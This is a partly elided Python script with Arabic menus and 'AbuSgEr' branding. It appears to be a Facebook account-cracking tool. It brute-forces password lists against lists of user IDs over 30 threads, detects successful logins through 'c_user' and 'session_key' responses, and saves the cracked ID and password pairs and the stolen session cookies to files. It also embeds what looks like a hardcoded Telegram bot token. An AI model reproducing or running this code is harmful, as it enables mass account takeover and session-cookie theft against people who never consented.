import datetime;now = datetime.date.today();target = datetime.date(2024,5,7)
if now >=target:exit("توقفت الاداه / الاداه مجانيه / @JJNJD قناتي حياكم الله")
else:print("هﺍﺩﻻﺍ ﻞﻴﻐﺸﺗ ﻢﺗ")
from os import path
from urllib.request import urlopen
import os,base64,zlib,pip,urllib,platform,math,shutil,random,uuid,string,hashlib,json,sys

print('\n\033[1;37m ﻪﺒﺤﻛ ﻦﺑﺍ ﻞﻐﺘﺸﺗ ﻪﺴﻫ ﺮﻀﺘﻧﺍ...')

#Cannot be decrypted  | AbuSgEr
        ...
        try:
                ...
                if "server on" in sj:
                        ...
                        if xd in ['1','01']:
                                ...
                                linex()
                                plist = []
                                print('\x1b[1;91m [01] \x1b[1;92mﻪﻳﻮﻗ ﺕﺍﺩﺭﻮﺳﺎﺑ👍🔥 \n\x1b[1;91m [02] \x1b[1;93mﺕﺍﺩﺭﻮﺳﺎﺑ ﻂﺤﺗ ﻡﺯﻻ😒 \n\x1b[1;91m [03] \x1b[1;94mﺏﺎﻌﻟﻻﺍ ﺭﻭﺩ ﺍﺫﺍ ﻩﺮﺘﺧﺍ💪🌚\n\x1b[1;91m [04] \x1b[1;95mﻩﺪﻳﺪﺟ ﺕﺍﺩﺭﻮﺳﺎﺑ🌚🔥 ');linex()
                                ppp=input(' Choose: ')
                                if ppp in ['1','01']:
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        lim=int(total_ids)
                                        print(' \x1b[1;93mتﺎﻳﺪﻳﺍ ﻒﻠﻣ دﺪﻋ✅🔥 : \033[1;32m'+total_ids)
                                        print("\033[1;32m ﻪﻄﺳﺍﻮﺑ ﻞﻴﻐﺸﺗ ﻢﺗ🔥")
                                        print("\033[1;96m  هﺍﺩﻻﺍ ﻞﻴﻐﺸﺗ ﻢﺗ ✔️ ")
                                        print("\033[1;34تﺎﺑﺎﺴﺤﻟﺍ ﺺﺤﻓ ﻢﺘﻳ ﺮﻈﺘﻧﺍ ✔️ ")
                                        linex()
...
def pak():
                ...
                with tred(max_workers=30) as ASX:     
                        clear()
                        tl = str(len(user))
                        print(' ﻚﻔﻠﻣ تﺎﻳﺪﻳﺍ دﺪﻋ : \033[1;32m  ﻪﻄﺳﺍﻮﺑ ﻞﻴﻐﺸﺗ ﻢﺗ')
                        print(f'\03[1;32mتم التشغيل بواسطه😜 الاغا')       
                        linex()
                        for psx in user:
                                ids = code+psx
...
def india():
                ...
                with tred(max_workers=30) as ASX:     
                        ...
                        print(f'\033[1;32m   ﺎﻏﻻﺍ ﻪﻄﺳﺍﻮﺑ ﻞﻴﻐﺸﺘﻟﺍ ﻢﺗ💪✅ ')
                        print(f'\033[1;32m Use airplane mode for speed up ')
                        linex()
...
def gmail():
                ...
                with tred(max_workers=30) as ASX:
                        total = str(len(fo))
                        clear()
                        print(' تﺎﻳﺪﻳﺍ ﻒﻠﻣ دﺪع : \033[1;32m'+total)
                        print("\033[1;32mﺍ  ﺎﻏﻻﺍ ﻪﻄﺳﺍﻮﺑ ﻞﻴﻐﺸﺘﻟﺍ ﻢﺗ")
                        linex()
                        for user in fo:
                                ids,names = user.split('|')
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;36m [\033[1;32mAbuSgEr\033[1;36m] \033[1;36m[\033[1;31m%s\033[1;36m] \033[1;36m[\033[1;32mOK\033[1;30m:-\033[1;32m%s\033[1;36m] \033[1;36m[\033[1;33m%s%%\033[1;36m]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
    ...
    "user-agent": ua,
                        ...
                        if "c_user" in ASX:
                                print('\r\r\033[1;32m [AbuSgEr-OK] %s | %s'%(ids,pas))
                                dc=dict(session.cookies)
                                coki=";".join([k+"="+v for k,v in dc.items()])
                                open('/sdcard/AbuSgEr-COOKIE.txt','a').write(coki+'\n')
                                open('/sdcard/AbuSgEr-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in ASX:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [AbuSgEr-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/AbuSgEr-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        global ok,loop,lim
                        p=round(loop*100/lim,2)
                        sys.stdout.write('\r\r\033[1;37m [AbuSgEr] [%s] \033[1;37m[OK=%s] [%s%%]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                            ...
                            "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',}
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [AbuSgEr-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/AbuSgEr.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
...
def rndm(ids,passlist):
        ...
        try:
                for pas in passlist:
                        ...
                        #print(data)
                        accessToken="6519460033:AAGCcvdBZUn1DnuXNyt79HFFSbJYYeOX5Fk"
                        headers={
                                    "method": 'GET', 
    "path": '/',
    "scheme": 'https', 
    ...
    "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [AbuSgEr-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        open('/sdcard/AbuSgEr-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/AbuSgEr-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [AbuSgEr-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/AbuSgEr-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
